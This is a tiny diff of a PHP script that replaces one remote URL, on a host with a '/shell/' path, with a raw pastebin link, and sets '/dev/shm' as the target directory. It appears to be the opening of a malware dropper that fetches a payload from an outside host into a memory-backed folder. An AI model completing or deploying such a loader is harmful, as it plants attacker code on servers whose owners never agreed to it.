@@ -1,6 +1,6 @@
 <?php
 
-    $url = 'http://aqilogic.com/shell/d/f4.txt';
+    $url = 'https://pastebin.com/raw/CdNWURPG';
 
     $targetDir = '/dev/shm';
 
